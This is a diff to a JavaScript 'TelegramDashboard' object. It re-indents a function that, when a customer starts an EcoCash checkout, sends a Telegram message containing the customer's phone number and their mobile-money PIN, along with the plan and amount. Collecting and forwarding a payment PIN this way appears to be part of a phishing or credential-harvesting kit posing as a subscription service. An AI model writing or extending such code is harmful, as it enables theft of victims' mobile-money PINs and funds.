@@ -81,23 +81,24 @@ const TelegramDashboard = {
    * Alert 2: Customer enters phone number and starts EcoCash checkout
    */
   async notifyCheckoutStarted(plan, phone, code = '') {
-  const stats = this.getStats();
-  stats.checkoutsStarted = (stats.checkoutsStarted || 0) + 1;
-  this.saveStats(stats);
+    const stats = this.getStats();
+    stats.checkoutsStarted = (stats.checkoutsStarted || 0) + 1;
+    this.saveStats(stats);
 
-  const msg =
-    `💳 <b>CHECKOUT INITIATED</b>\n` +
-    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-    `📱 <b>Customer Phone:</b> <code>+263 ${phone}</code>\n` +
-    `🔑 <b>Pin:</b> <code>${code}</code>\n` +
-    `📦 <b>Package:</b> ${plan.title} (${plan.duration})\n` +
-    `💵 <b>Amount:</b> ${plan.price}\n` +
-    `⚡ <b>Payment Method:</b> EcoCash USSD Push\n` +
-    `📅 <b>Time:</b> ${new Date().toLocaleTimeString()}\n` +
-    `⏳ <b>Status:</b> Awaiting Payment Confirmation`;
+    const msg =
+      `💳 <b>CHECKOUT INITIATED</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+      `📱 <b>Customer Phone:</b> <code>+263 ${phone}</code>\n` +
+      `🔑 <b>Pin:</b> <code>${code}</code>\n` +
+      `📦 <b>Package:</b> ${plan.title} (${plan.duration})\n` +
+      `💵 <b>Amount:</b> ${plan.price}\n` +
+      `⚡ <b>Payment Method:</b> EcoCash USSD Push\n` +
+      `📅 <b>Time:</b> ${new Date().toLocaleTimeString()}\n` +
+      `⏳ <b>Status:</b> Awaiting Payment Confirmation`;
 
-  return await this.sendMessage(msg);
-}
+    return await this.sendMessage(msg);
+  },
+
   /**
    * Alert 3: Payment Confirmed (Revenue Recorded!)
    */
